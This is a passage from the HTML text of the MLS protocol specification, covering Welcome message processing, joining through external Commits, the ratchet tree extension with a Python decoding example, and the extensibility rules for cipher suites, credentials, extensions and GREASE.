processing the Welcome.<a href="#section-12.4.3.1-6">¬∂</a></p>
<p id="section-12.4.3.1-7">On receiving a Welcome message, a client processes it using the following steps:<a href="#section-12.4.3.1-7">¬∂</a></p>
<ul>
<li id="section-12.4.3.1-8.1">Identify an entry in the <code>secrets</code> array where the <code>new_member</code>
value corresponds to one of this client's KeyPackages, using the hash
indicated by the <code>cipher_suite</code> field. If no such field exists, or if the
cipher suite indicated in the KeyPackage does not match the one in the
Welcome message, return an error.<a href="#section-12.4.3.1-8.1">¬∂</a>
</li>
              <li id="section-12.4.3.1-8.2">Decrypt the <code>encrypted_group_secrets</code> value with the algorithms indicated by
the cipher suite and the private key <code>init_key_priv</code> corresponding to
<code>init_key</code> in the referenced KeyPackage.<a href="#section-12.4.3.1-8.2">¬∂</a>
</li>
            </ul>
<div id="section-12.4.3.1-9">
<pre>encrypted_group_secrets =
  EncryptWithLabel(init_key, "Welcome",
                   encrypted_group_info, group_secrets)

group_secrets =
  DecryptWithLabel(init_key_priv, "Welcome",
                   encrypted_group_info, kem_output, ciphertext)
</pre><p><a href="#section-12.4.3.1-9">¬∂</a>
</p></div>
<ul>
<li id="section-12.4.3.1-10.1">If a PreSharedKeyID is part of the GroupSecrets and the client is not in
possession of the corresponding PSK, return an error. Additionally, if a
PreSharedKeyID has type <code>resumption</code> with usage <code>reinit</code> or <code>branch</code>, verify
that it is the only such PSK.<a href="#section-12.4.3.1-10.1">¬∂</a>
</li>
              <li id="section-12.4.3.1-10.2">From the <code>joiner_secret</code> in the decrypted GroupSecrets object and the PSKs
specified in the GroupSecrets, derive the <code>welcome_secret</code> and then
the <code>welcome_key</code> and <code>welcome_nonce</code>. Use the key and nonce to decrypt the
<code>encrypted_group_info</code> field.<a href="#section-12.4.3.1-10.2">¬∂</a>
</li>
            </ul>
<div id="section-12.4.3.1-11">
<pre>welcome_nonce = ExpandWithLabel(welcome_secret, "nonce", "", AEAD.Nn)
welcome_key = ExpandWithLabel(welcome_secret, "key", "", AEAD.Nk)
</pre><p><a href="#section-12.4.3.1-11">¬∂</a>
</p></div>
<ul>
<li id="section-12.4.3.1-12.1">Verify the signature on the GroupInfo object. The signature input comprises
all of the fields in the GroupInfo object except the signature field. The
public key is taken from the LeafNode of the
ratchet tree with leaf index <code>signer</code>. If the node is blank or if
signature verification fails, return an error.<a href="#section-12.4.3.1-12.1">¬∂</a>
</li>
              <li id="section-12.4.3.1-12.2">Verify that the <code>group_id</code> is unique among the groups that the client is
currently participating in.<a href="#section-12.4.3.1-12.2">¬∂</a>
</li>
              <li id="section-12.4.3.1-12.3">Verify that the <code>cipher_suite</code> in the GroupInfo matches the <code>cipher_suite</code> in
the KeyPackage.<a href="#section-12.4.3.1-12.3">¬∂</a>
</li>
              <li id="section-12.4.3.1-12.4">
                <p id="section-12.4.3.1-12.4.1">Verify the integrity of the ratchet tree.<a href="#section-12.4.3.1-12.4.1">¬∂</a></p>
<ul>
<li id="section-12.4.3.1-12.4.2.1">Verify that the tree hash of the ratchet tree matches the <code>tree_hash</code> field
in GroupInfo.<a href="#section-12.4.3.1-12.4.2.1">¬∂</a>
</li>
                  <li id="section-12.4.3.1-12.4.2.2">For each non-empty parent node, verify that it is "parent-hash valid",
as described in <a href="#verifying-parent-hashes">Section 7.9.2</a>.<a href="#section-12.4.3.1-12.4.2.2">¬∂</a>
</li>
                  <li id="section-12.4.3.1-12.4.2.3">For each non-empty leaf node, validate the LeafNode as described in
<a href="#leaf-node-validation">Section 7.3</a>.<a href="#section-12.4.3.1-12.4.2.3">¬∂</a>
</li>
                  <li id="section-12.4.3.1-12.4.2.4">
                    <p id="section-12.4.3.1-12.4.2.4.1">For each non-empty parent node and each entry in the node's
<code>unmerged_leaves</code> field:<a href="#section-12.4.3.1-12.4.2.4.1">¬∂</a></p>
<ul>
<li id="section-12.4.3.1-12.4.2.4.2.1">Verify that the entry represents a non-blank leaf node that is a
descendant of the parent node.<a href="#section-12.4.3.1-12.4.2.4.2.1">¬∂</a>
</li>
                      <li id="section-12.4.3.1-12.4.2.4.2.2">Verify that every non-blank intermediate node between the leaf node and the
parent node also has an entry for the leaf node in its <code>unmerged_leaves</code>.<a href="#section-12.4.3.1-12.4.2.4.2.2">¬∂</a>
</li>
                      <li id="section-12.4.3.1-12.4.2.4.2.3">Verify that the encryption key in the parent node does not appear in any
other node of the tree.<a href="#section-12.4.3.1-12.4.2.4.2.3">¬∂</a>
</li>
                    </ul>
</li>
                </ul>
</li>
              <li id="section-12.4.3.1-12.5">Identify a leaf whose LeafNode is
identical to the one in the KeyPackage.  If no such field exists, return an
error.  Let <code>my_leaf</code> represent this leaf in the tree.<a href="#section-12.4.3.1-12.5">¬∂</a>
</li>
              <li id="section-12.4.3.1-12.6">
                <p id="section-12.4.3.1-12.6.1">Construct a new group state using the information in the GroupInfo object.<a href="#section-12.4.3.1-12.6.1">¬∂</a></p>
<ul>
<li id="section-12.4.3.1-12.6.2.1">Initialize the GroupContext for the group from the <code>group_context</code> field
from the GroupInfo object.<a href="#section-12.4.3.1-12.6.2.1">¬∂</a>
</li>
                  <li id="section-12.4.3.1-12.6.2.2">Update the leaf <code>my_leaf</code> with the private key corresponding to the
public key in the node, where <code>my_leaf</code> is the new member's leaf node in
the ratchet tree, as defined above.<a href="#section-12.4.3.1-12.6.2.2">¬∂</a>
</li>
                  <li id="section-12.4.3.1-12.6.2.3">If the <code>path_secret</code> value is set in the GroupSecrets object: Identify the
lowest common ancestor of the leaf node <code>my_leaf</code> and of the node of
the member with leaf index <code>GroupInfo.signer</code>. Set the private key for
this node to the private key derived from the <code>path_secret</code>.<a href="#section-12.4.3.1-12.6.2.3">¬∂</a>
</li>
                  <li id="section-12.4.3.1-12.6.2.4">For each parent of the common ancestor, up to the root of the tree, derive
a new path secret, and set the private key for the node to the private key
derived from the path secret.  The private key <span>MUST</span> be the private key
that corresponds to the public key in the node.<a href="#section-12.4.3.1-12.6.2.4">¬∂</a>
</li>
                </ul>
</li>
              <li id="section-12.4.3.1-12.7">Use the <code>joiner_secret</code> from the GroupSecrets object to generate the epoch secret
and other derived secrets for the current epoch.<a href="#section-12.4.3.1-12.7">¬∂</a>
</li>
              <li id="section-12.4.3.1-12.8">Set the confirmed transcript hash in the new state to the value of the
<code>confirmed_transcript_hash</code> in the GroupInfo.<a href="#section-12.4.3.1-12.8">¬∂</a>
</li>
              <li id="section-12.4.3.1-12.9">Verify the confirmation tag in the GroupInfo using the derived confirmation
key and the <code>confirmed_transcript_hash</code> from the GroupInfo.<a href="#section-12.4.3.1-12.9">¬∂</a>
</li>
              <li id="section-12.4.3.1-12.10">Use the confirmed transcript hash and confirmation tag to compute the interim
transcript hash in the new state.<a href="#section-12.4.3.1-12.10">¬∂</a>
</li>
              <li id="section-12.4.3.1-12.11">
                <p id="section-12.4.3.1-12.11.1">If a PreSharedKeyID was used that has type <code>resumption</code> with usage <code>reinit</code>
or <code>branch</code>, verify that the <code>epoch</code> field in the GroupInfo is equal to 1.<a href="#section-12.4.3.1-12.11.1">¬∂</a></p>
<ul>
<li id="section-12.4.3.1-12.11.2.1">For usage <code>reinit</code>, verify that the last Commit to the referenced group
contains a ReInit proposal and that the <code>group_id</code>, <code>version</code>,
<code>cipher_suite</code>, and <code>group_context.extensions</code> fields of the GroupInfo match
the ReInit proposal. Additionally, verify that all the members of the old
group are also members of the new group, according to the application.<a href="#section-12.4.3.1-12.11.2.1">¬∂</a>
</li>
                  <li id="section-12.4.3.1-12.11.2.2">For usage <code>branch</code>, verify that the <code>version</code> and <code>cipher_suite</code> of the new
group match those of the old group, and that the members of the new group
compose a subset of the members of the old group, according to the
application.<a href="#section-12.4.3.1-12.11.2.2">¬∂</a>
</li>
                </ul>
</li>
            </ul>
</section>
<section id="joining-via-external-commits">
            <h5 id="name-joining-via-external-commit">
<a href="#section-12.4.3.2">12.4.3.2. </a><a href="#name-joining-via-external-commit">Joining via External Commits</a>
            </h5>
<p id="section-12.4.3.2-1">External Commits are a mechanism for new members (external parties that want to
become members of the group) to add themselves to a group, without requiring
that an existing member has to come online to issue a Commit that references an
Add proposal.<a href="#section-12.4.3.2-1">¬∂</a></p>
<p id="section-12.4.3.2-2">Whether existing members of the group will accept or reject an external Commit
follows the same rules that are applied to other handshake messages.<a href="#section-12.4.3.2-2">¬∂</a></p>
<p id="section-12.4.3.2-3">New members can create and issue an external Commit if they have access to the
following information for the group's current epoch:<a href="#section-12.4.3.2-3">¬∂</a></p>
<ul>
<li id="section-12.4.3.2-4.1">group ID<a href="#section-12.4.3.2-4.1">¬∂</a>
</li>
              <li id="section-12.4.3.2-4.2">epoch ID<a href="#section-12.4.3.2-4.2">¬∂</a>
</li>
              <li id="section-12.4.3.2-4.3">cipher suite<a href="#section-12.4.3.2-4.3">¬∂</a>
</li>
              <li id="section-12.4.3.2-4.4">public tree hash<a href="#section-12.4.3.2-4.4">¬∂</a>
</li>
              <li id="section-12.4.3.2-4.5">confirmed transcript hash<a href="#section-12.4.3.2-4.5">¬∂</a>
</li>
              <li id="section-12.4.3.2-4.6">confirmation tag of the most recent Commit<a href="#section-12.4.3.2-4.6">¬∂</a>
</li>
              <li id="section-12.4.3.2-4.7">group extensions<a href="#section-12.4.3.2-4.7">¬∂</a>
</li>
              <li id="section-12.4.3.2-4.8">external public key<a href="#section-12.4.3.2-4.8">¬∂</a>
</li>
            </ul>
<p id="section-12.4.3.2-5">In other words, to join a group via an external Commit, a new member needs a
GroupInfo with an <code>external_pub</code> extension present in its <code>extensions</code> field.<a href="#section-12.4.3.2-5">¬∂</a></p>
<div id="section-12.4.3.2-6">
<pre>struct {
    HPKEPublicKey external_pub;
} ExternalPub;
</pre><p><a href="#section-12.4.3.2-6">¬∂</a>
</p></div>
<p id="section-12.4.3.2-7">Thus, a member of the group can enable new clients to join by making a GroupInfo
object available to them. Note that because a GroupInfo object is specific to an
epoch, it will need to be updated as the group advances. In particular, each
GroupInfo object can be used for one external join, since that external join
will cause the epoch to change.<a href="#section-12.4.3.2-7">¬∂</a></p>
<p id="section-12.4.3.2-8">Note that the <code>tree_hash</code> field is used the same way as in the Welcome message.
The full tree can be included via the <code>ratchet_tree</code> extension
(see <a href="#ratchet-tree-extension">Section 12.4.3.3</a>).<a href="#section-12.4.3.2-8">¬∂</a></p>
<p id="section-12.4.3.2-9">The information in a GroupInfo is not generally public information, but applications
can choose to make it available to new members in order to allow External
Commits.<a href="#section-12.4.3.2-9">¬∂</a></p>
<p id="section-12.4.3.2-10">In principle, external Commits work like regular Commits. However, their content
has to meet a specific set of requirements:<a href="#section-12.4.3.2-10">¬∂</a></p>
<ul>
<li id="section-12.4.3.2-11.1">External Commits <span>MUST</span> contain a <code>path</code> field (and is therefore a "full"
Commit).  The joiner is added at the leftmost free leaf node (just as if they
were added with an Add proposal), and the path is calculated relative to that
leaf node.<a href="#section-12.4.3.2-11.1">¬∂</a>
</li>
              <li id="section-12.4.3.2-11.2">The Commit <span>MUST NOT</span> include any proposals by reference, since an external
joiner cannot determine the validity of proposals sent within the group.<a href="#section-12.4.3.2-11.2">¬∂</a>
</li>
              <li id="section-12.4.3.2-11.3">External Commits <span>MUST</span> be signed by the new member.  In particular, the
signature on the enclosing AuthenticatedContent <span>MUST</span> verify using the public key for
the credential in the <code>leaf_node</code> of the <code>path</code> field.<a href="#section-12.4.3.2-11.3">¬∂</a>
</li>
              <li id="section-12.4.3.2-11.4">When processing a Commit, both existing and new members <span>MUST</span> use the external
init secret as described in <a href="#external-initialization">Section 8.3</a>.<a href="#section-12.4.3.2-11.4">¬∂</a>
</li>
              <li id="section-12.4.3.2-11.5">The sender type for the AuthenticatedContent encapsulating the external Commit <span>MUST</span> be
<code>new_member_commit</code>.<a href="#section-12.4.3.2-11.5">¬∂</a>
</li>
            </ul>
<p id="section-12.4.3.2-12">External Commits come in two "flavors" -- a "join" Commit that
adds the sender to the group or a "resync" Commit that replaces a member's prior
appearance with a new one.<a href="#section-12.4.3.2-12">¬∂</a></p>
<p id="section-12.4.3.2-13">Note that the "resync" operation allows an attacker that has compromised a
member's signature private key to introduce themselves into the group and remove the
prior, legitimate member in a single Commit.  Without resync, this
can still be done, but it requires two operations: the external Commit to join and
a second Commit to remove the old appearance.  Applications for whom this
distinction is salient can choose to disallow external commits that contain a
Remove, or to allow such resync commits only if they contain a "reinit" PSK
proposal that demonstrates the joining member's presence in a prior epoch of the
group.  With the latter approach, the attacker would need to compromise the PSK
as well as the signing key, but the application will need to ensure that
continuing, non-resynchronizing members have the required PSK.<a href="#section-12.4.3.2-13">¬∂</a></p>
</section>
<section id="ratchet-tree-extension">
            <h5 id="name-ratchet-tree-extension">
<a href="#section-12.4.3.3">12.4.3.3. </a><a href="#name-ratchet-tree-extension">Ratchet Tree Extension</a>
            </h5>
<p id="section-12.4.3.3-1">By default, a GroupInfo message only provides the joiner with a hash of
the group's ratchet tree.  In order to process or generate handshake
messages, the joiner will need to get a copy of the ratchet tree from some other
source.  (For example, the DS might provide a cached copy.)  The inclusion of
the tree hash in the GroupInfo message means that the source of the ratchet
tree need not be trusted to maintain the integrity of the tree.<a href="#section-12.4.3.3-1">¬∂</a></p>
<p id="section-12.4.3.3-2">In cases where the application does not wish to provide such an external source,
the whole public state of the ratchet tree can be provided in an extension of
type <code>ratchet_tree</code>, containing a <code>ratchet_tree</code> object of the following form:<a href="#section-12.4.3.3-2">¬∂</a></p>
<div id="section-12.4.3.3-3">
<pre>struct {
    NodeType node_type;
    select (Node.node_type) {
        case leaf:   LeafNode leaf_node;
        case parent: ParentNode parent_node;
    };
} Node;

optional&lt;Node&gt; ratchet_tree&lt;V&gt;;
</pre><p><a href="#section-12.4.3.3-3">¬∂</a>
</p></div>
<p id="section-12.4.3.3-4">Each entry in the <code>ratchet_tree</code> vector provides the value for a node in the
tree, or the null optional for a blank node.<a href="#section-12.4.3.3-4">¬∂</a></p>
<p id="section-12.4.3.3-5">The nodes are listed in the order specified by a left-to-right in-order
traversal of the ratchet tree. Each node is listed between its left subtree and
its right subtree.  (This is the same ordering as specified for the array-based
trees outlined in <a href="#array-based-trees">Appendix C</a>.)<a href="#section-12.4.3.3-5">¬∂</a></p>
<p id="section-12.4.3.3-6">If the tree has 2<sup>d</sup> leaves, then it has 2<sup>d+1</sup> - 1 nodes.  The
<code>ratchet_tree</code> vector logically has this number of entries, but the sender
<span>MUST NOT</span> include blank nodes after the last non-blank node.  The receiver <span>MUST</span>
check that the last node in <code>ratchet_tree</code> is non-blank, and then extend the tree to the
right until it has a length of the form 2<sup>d+1</sup> - 1, adding the minimum number
of blank values possible.  (Obviously, this may be done "virtually", by
synthesizing blank nodes when required, as opposed to actually changing the
structure in memory.)<a href="#section-12.4.3.3-6">¬∂</a></p>
<p id="section-12.4.3.3-7">The leaves of the tree are stored in even-numbered entries in the array (the
leaf with index <code>L</code> in array position <code>2*L</code>). The root node of the tree is at
position 2<sup>d</sup> - 1 of the array. Intermediate parent nodes can be identified by
performing the same calculation to the subarrays to the left and right of the
root, following something like the following algorithm:<a href="#section-12.4.3.3-7">¬∂</a></p>
<div id="section-12.4.3.3-8">
<pre># Assuming a class Node that has left and right members
def subtree_root(nodes):
    # If there is only one node in the array, return it
    if len(nodes) == 1:
        return Node(nodes[0])

    # Otherwise, the length of the array MUST be odd
    if len(nodes) % 2 == 0:
        raise Exception("Malformed node array {}", len(nodes))

    # Identify the root of the subtree
    d = 0
    while (2**(d+1)) &lt; len(nodes):
       d += 1
    R = 2**d - 1
    root = Node(nodes[R])
    root.left = subtree_root(nodes[:R])
    root.right = subtree_root(nodes[(R+1):])
    return root
</pre><p><a href="#section-12.4.3.3-8">¬∂</a>
</p></div>
<p id="section-12.4.3.3-9">(Note that this is the same ordering of nodes as in the array-based tree representation
described in <a href="#array-based-trees">Appendix C</a>.  The algorithms in that section may be used to
simplify decoding this extension into other representations.)<a href="#section-12.4.3.3-9">¬∂</a></p>
<p id="section-12.4.3.3-10">For example, the following tree with six non-blank leaves would be represented
as an array of eleven elements, <code>[A, W, B, X, C, _, D, Y, E, Z, F]</code>.  The above
decoding procedure would identify the subtree roots as follows (using R to
represent a subtree root):<a href="#section-12.4.3.3-10">¬∂</a></p>
<span id="name-left-to-right-in-order-trav"></span><figure id="figure-28">
              <div id="section-12.4.3.3-11.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="304" text-anchor="middle" version="1.1" viewBox="0 0 240 304" width="240">
                    <path d="M 56,112 L 56,128" fill="none" stroke="black"></path>
                    <path d="M 120,48 L 120,64" fill="none" stroke="black"></path>
                    <path d="M 184,104 L 184,128" fill="none" stroke="black"></path>
                    <path d="M 72,64 L 168,64" fill="none" stroke="black"></path>
                    <path d="M 40,128 L 72,128" fill="none" stroke="black"></path>
                    <path d="M 168,128 L 200,128" fill="none" stroke="black"></path>
                    <path d="M 8,256 L 104,256" fill="none" stroke="black"></path>
                    <path d="M 136,256 L 232,256" fill="none" stroke="black"></path>
                    <path d="M 8,272 L 40,272" fill="none" stroke="black"></path>
                    <path d="M 72,272 L 104,272" fill="none" stroke="black"></path>
                    <path d="M 136,272 L 168,272" fill="none" stroke="black"></path>
                    <path d="M 200,272 L 232,272" fill="none" stroke="black"></path>
                    <path d="M 72,128 L 80,144" fill="none" stroke="black"></path>
                    <path d="M 92,168 L 96,176" fill="none" stroke="black"></path>
                    <path d="M 168,64 L 176,80" fill="none" stroke="black"></path>
                    <path d="M 200,128 L 208,144" fill="none" stroke="black"></path>
                    <path d="M 220,168 L 224,176" fill="none" stroke="black"></path>
                    <path d="M 32,144 L 40,128" fill="none" stroke="black"></path>
                    <path d="M 64,80 L 72,64" fill="none" stroke="black"></path>
                    <path d="M 80,176 L 84,168" fill="none" stroke="black"></path>
                    <path d="M 160,144 L 168,128" fill="none" stroke="black"></path>
                    <path d="M 208,176 L 212,168" fill="none" stroke="black"></path>
                    <polygon fill="black" points="240,272 228,266.4 228,277.6" transform="rotate(0,232,272)"></polygon>
                    <polygon fill="black" points="240,256 228,250.4 228,261.6" transform="rotate(0,232,256)"></polygon>
                    <polygon fill="black" points="208,272 196,266.4 196,277.6" transform="rotate(180,200,272)"></polygon>
                    <polygon fill="black" points="176,272 164,266.4 164,277.6" transform="rotate(0,168,272)"></polygon>
                    <polygon fill="black" points="144,272 132,266.4 132,277.6" transform="rotate(180,136,272)"></polygon>
                    <polygon fill="black" points="144,256 132,250.4 132,261.6" transform="rotate(180,136,256)"></polygon>
                    <polygon fill="black" points="112,272 100,266.4 100,277.6" transform="rotate(0,104,272)"></polygon>
                    <polygon fill="black" points="112,256 100,250.4 100,261.6" transform="rotate(0,104,256)"></polygon>
                    <polygon fill="black" points="80,272 68,266.4 68,277.6" transform="rotate(180,72,272)"></polygon>
                    <polygon fill="black" points="48,272 36,266.4 36,277.6" transform="rotate(0,40,272)"></polygon>
                    <polygon fill="black" points="16,272 4,266.4 4,277.6" transform="rotate(180,8,272)"></polygon>
                    <polygon fill="black" points="16,256 4,250.4 4,261.6" transform="rotate(180,8,256)"></polygon>
                    <g>
                      <text x="120" y="36">Y</text>
                      <text x="56" y="100">X</text>
                      <text x="184" y="100">_</text>
                      <text x="24" y="164">W</text>
                      <text x="88" y="164">_</text>
                      <text x="152" y="164">Z</text>
                      <text x="216" y="164">_</text>
                      <text x="16" y="180">/</text>
                      <text x="32" y="180">\</text>
                      <text x="144" y="180">/</text>
                      <text x="160" y="180">\</text>
                      <text x="8" y="196">A</text>
                      <text x="40" y="196">B</text>
                      <text x="72" y="196">C</text>
                      <text x="104" y="196">D</text>
                      <text x="136" y="196">E</text>
                      <text x="168" y="196">F</text>
                      <text x="200" y="196">_</text>
                      <text x="232" y="196">_</text>
                      <text x="168" y="228">1</text>
                      <text x="8" y="244">0</text>
                      <text x="24" y="244">1</text>
                      <text x="40" y="244">2</text>
                      <text x="56" y="244">3</text>
                      <text x="72" y="244">4</text>
                      <text x="88" y="244">5</text>
                      <text x="104" y="244">6</text>
                      <text x="120" y="244">7</text>
                      <text x="136" y="244">8</text>
                      <text x="152" y="244">9</text>
                      <text x="168" y="244">0</text>
                      <text x="120" y="260">R</text>
                      <text x="56" y="276">R</text>
                      <text x="184" y="276">R</text>
                      <text x="8" y="292">-</text>
                      <text x="24" y="292">R</text>
                      <text x="40" y="292">-</text>
                      <text x="72" y="292">-</text>
                      <text x="88" y="292">R</text>
                      <text x="104" y="292">-</text>
                      <text x="136" y="292">-</text>
                      <text x="152" y="292">R</text>
                      <text x="168" y="292">-</text>
                      <text x="200" y="292">-</text>
                      <text x="216" y="292">R</text>
                      <text x="232" y="292">-</text>
                    </g>
                  </svg><p><a href="#section-12.4.3.3-11.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-28">Figure 28</a>:
<a href="#name-left-to-right-in-order-trav">Left-to-Right In-Order Traversal of a Six-Member Tree</a>
              </figcaption></figure>
<p id="section-12.4.3.3-12">The presence of a <code>ratchet_tree</code> extension in a GroupInfo message does not
result in any changes to the GroupContext extensions for the group.  The ratchet
tree provided is simply stored by the client and used for MLS operations.<a href="#section-12.4.3.3-12">¬∂</a></p>
<p id="section-12.4.3.3-13">If this extension is not provided in a Welcome message, then the client will
need to fetch the ratchet tree over some other channel before it can generate or
process Commit messages.  Applications should ensure that this out-of-band
channel is provided with security protections equivalent to the protections that
are afforded to Proposal and Commit messages.  For example, an application that
encrypts Proposal and Commit messages might distribute ratchet trees encrypted
using a key exchanged over the MLS channel.<a href="#section-12.4.3.3-13">¬∂</a></p>
<p id="section-12.4.3.3-14">Regardless of how the client obtains the tree, the client <span>MUST</span> verify that the
root hash of the ratchet tree matches the <code>tree_hash</code> of the GroupContext before
using the tree for MLS operations.<a href="#section-12.4.3.3-14">¬∂</a></p>
</section>
</section>
</section>
</section>
<section id="extensibility">
      <h2 id="name-extensibility">
<a href="#section-13">13. </a><a href="#name-extensibility">Extensibility</a>
      </h2>
<p id="section-13-1">The base MLS protocol can be extended in a few ways.  New cipher suites can be
added to enable the use of new cryptographic algorithms.  New types of proposals
can be used to perform new actions within an epoch.  Extension fields can be
used to add additional information to the protocol.  In this section, we discuss
some constraints on these extensibility mechanisms that are necessary to ensure
broad interoperability.<a href="#section-13-1">¬∂</a></p>
<section id="additional-cipher-suites">
        <h3 id="name-additional-cipher-suites">
<a href="#section-13.1">13.1. </a><a href="#name-additional-cipher-suites">Additional Cipher Suites</a>
        </h3>
<p id="section-13.1-1">As discussed in <a href="#cipher-suites">Section 5.1</a>, MLS allows the participants in a group to
negotiate the cryptographic algorithms used within the group.  This
extensibility is important for maintaining the security of the protocol over
time <span>[<a href="#RFC7696">RFC7696</a>]</span>.  It also creates a risk of interoperability failure due to
clients not supporting a common cipher suite.<a href="#section-13.1-1">¬∂</a></p>
<p id="section-13.1-2">The cipher suite registry defined in <a href="#mls-cipher-suites">Section 17.1</a> attempts to strike a
balance on this point.  On the one hand, the base policy for the registry is
Specification Required, a fairly low bar designed to avoid the need for
standards work in cases where different ciphers are needed for niche
applications.  On the other hand, there is a higher bar (Standards Action) for ciphers to set the
Recommended field in the registry.  This higher bar is there in part to ensure
that the interoperability implications of new cipher suites are considered.<a href="#section-13.1-2">¬∂</a></p>
<p id="section-13.1-3">MLS cipher suites are defined independent of MLS versions, so that in principle,
the same cipher suite can be used across versions.  Standards work defining new
versions of MLS should consider whether it is desirable for the new version to
be compatible with existing cipher suites, or whether the new version should rule
out some cipher suites. For example, a new version could follow the example of
HTTP/2, which restricted the set of allowed TLS ciphers (see <span><a href="https://www.rfc-editor.org/rfc/rfc9113#section-9.2.2">Section 9.2.2</a> of [<a href="#RFC9113">RFC9113</a>]</span>).<a href="#section-13.1-3">¬∂</a></p>
</section>
<section id="proposals-1">
        <h3 id="name-proposals-2">
<a href="#section-13.2">13.2. </a><a href="#name-proposals-2">Proposals</a>
        </h3>
<p id="section-13.2-1">Commit messages do not have an extension field because the set of proposals is
extensible.  As discussed in <a href="#commit">Section 12.4</a>, Proposals with a non-default proposal
type <span>MUST NOT</span> be included in a commit unless the proposal type is supported by
all the members of the group that will process the Commit.<a href="#section-13.2-1">¬∂</a></p>
</section>
<section id="credential-extensibility">
        <h3 id="name-credential-extensibility">
<a href="#section-13.3">13.3. </a><a href="#name-credential-extensibility">Credential Extensibility</a>
        </h3>
<p id="section-13.3-1">In order to ensure that MLS provides meaningful authentication, it is important
that each member is able to authenticate some identity information for each
other member.  Identity information is encoded in Credentials, so this property
is provided by ensuring that members use compatible credential types.<a href="#section-13.3-1">¬∂</a></p>
<p id="section-13.3-2">The only types of credential that may be used in a group are those that all
members of the group support, as specified by the <code>capabilities</code> field of each
LeafNode in the ratchet tree. An application can introduce new credential types
by choosing an unallocated identifier from the registry in
<a href="#mls-credential-types">Section 17.5</a> and indicating support for the credential type in
published LeafNodes, whether in Update proposals to existing groups or
KeyPackages that are added to new groups. Once all members in a group indicate
support for the credential type, members can start using LeafNodes with the new
credential. Application may enforce that certain credential types always remain
supported by adding a <code>required_capabilities</code> extension to the group's
GroupContext, which would prevent any member from being added to the group that
doesn't support them.<a href="#section-13.3-2">¬∂</a></p>
<p id="section-13.3-3">In future extensions to MLS, it may be useful to allow a member to present more
than one credential.  For example, such credentials might present different
attributes attested by different authorities.  To be consistent with the general
principle stated at the beginning of this section, such an extension would need
to ensure that each member can authenticate some identity for each other member.
For each pair of members (Alice, Bob), Alice would need to present at least one
credential of a type that Bob supports.<a href="#section-13.3-3">¬∂</a></p>
</section>
<section id="extensions">
        <h3 id="name-extensions">
<a href="#section-13.4">13.4. </a><a href="#name-extensions">Extensions</a>
        </h3>
<p id="section-13.4-1">This protocol includes a mechanism for negotiating extension parameters similar
to the one in TLS <span>[<a href="#RFC8446">RFC8446</a>]</span>.  In TLS, extension negotiation is one-to-one: The
client offers extensions in its ClientHello message, and the server expresses
its choices for the session with extensions in its ServerHello and
EncryptedExtensions messages.  In MLS, extensions appear in the following
places:<a href="#section-13.4-1">¬∂</a></p>
<ul>
<li id="section-13.4-2.1">In KeyPackages, to describe additional information related to the client<a href="#section-13.4-2.1">¬∂</a>
</li>
          <li id="section-13.4-2.2">In LeafNodes, to describe additional information about the client or its
participation in the group (once in the ratchet tree)<a href="#section-13.4-2.2">¬∂</a>
</li>
          <li id="section-13.4-2.3">In the GroupInfo, to tell new members of a group what parameters are
being used by the group, and to provide any additional details required to
join the group<a href="#section-13.4-2.3">¬∂</a>
</li>
          <li id="section-13.4-2.4">In the GroupContext object, to ensure that all members of the group have the
same view of the parameters in use<a href="#section-13.4-2.4">¬∂</a>
</li>
        </ul>
<p id="section-13.4-3">In other words, an application can use GroupContext extensions to ensure that
all members of the group agree on a set of parameters. Clients indicate their
support for parameters in the <code>capabilities</code> field of their LeafNode. New
members of a group are informed of the group's GroupContext extensions via the
<code>extensions</code> field in the <code>group_context</code> field of the GroupInfo object. The
<code>extensions</code> field in a GroupInfo object (outside of the <code>group_context</code> field)
can be used to provide additional parameters to new joiners that are used to
join the group.<a href="#section-13.4-3">¬∂</a></p>
<p id="section-13.4-4">This extension mechanism is designed to allow for the secure and forward-compatible
negotiation of extensions.  For this to work, implementations <span>MUST</span> correctly
handle extensible fields:<a href="#section-13.4-4">¬∂</a></p>
<ul>
<li id="section-13.4-5.1">A client that posts a KeyPackage <span>MUST</span> support all parameters advertised in
it. Otherwise, another client might fail to interoperate by selecting one of
those parameters.<a href="#section-13.4-5.1">¬∂</a>
</li>
          <li id="section-13.4-5.2">A client processing a KeyPackage object <span>MUST</span> ignore all unrecognized values
in the <code>capabilities</code> field of the LeafNode and all unknown extensions in
the <code>extensions</code> and <code>leaf_node.extensions</code> fields.  Otherwise, it could fail
to interoperate with newer clients.<a href="#section-13.4-5.2">¬∂</a>
</li>
          <li id="section-13.4-5.3">A client processing a GroupInfo object <span>MUST</span> ignore all unrecognized
extensions in the <code>extensions</code> field.<a href="#section-13.4-5.3">¬∂</a>
</li>
          <li id="section-13.4-5.4">Any field containing a list of extensions <span>MUST NOT</span> have more than one
extension of any given type.<a href="#section-13.4-5.4">¬∂</a>
</li>
          <li id="section-13.4-5.5">A client adding a new member to a group <span>MUST</span> verify that the LeafNode for the
new member is compatible with the group's extensions.  The <code>capabilities</code>
field <span>MUST</span> indicate support for each extension in the GroupContext.<a href="#section-13.4-5.5">¬∂</a>
</li>
          <li id="section-13.4-5.6">A client joining a group <span>MUST</span> verify that it supports every extension in the
GroupContext for the group.  Otherwise, it <span>MUST</span> treat the enclosing
GroupInfo message as invalid and not join the group.<a href="#section-13.4-5.6">¬∂</a>
</li>
        </ul>
<p id="section-13.4-6">Note that the latter two requirements mean that all MLS GroupContext extensions
are mandatory, in the sense that an extension in use by the group <span>MUST</span> be
supported by all members of the group.<a href="#section-13.4-6">¬∂</a></p>
<p id="section-13.4-7">The parameters of a group may be changed by sending a GroupContextExtensions
proposal to enable additional extensions (<a href="#groupcontextextensions">Section 12.1.7</a>), or
by reinitializing the group (<a href="#reinitialization">Section 11.2</a>).<a href="#section-13.4-7">¬∂</a></p>
</section>
<section id="grease">
        <h3 id="name-grease">
<a href="#section-13.5">13.5. </a><a href="#name-grease">GREASE</a>
        </h3>
<p id="section-13.5-1">As described in <a href="#extensions">Section 13.4</a>, clients are required to ignore unknown values
for certain parameters.  To help ensure that other clients implement this
behavior, a client can follow the "Generate Random Extensions And Sustain
Extensibility" or GREASE approach described in <span>[<a href="#RFC8701">RFC8701</a>]</span>.  In the context of
MLS, this means that a client generating a KeyPackage, LeafNode, or GroupInfo object includes
random values in certain fields which would be ignored by a
correctly implemented client processing the message.  A client that incorrectly
rejects unknown code points will fail to process such a message, providing a
signal to its implementer that the client needs to be fixed.<a href="#section-13.5-1">¬∂</a></p>
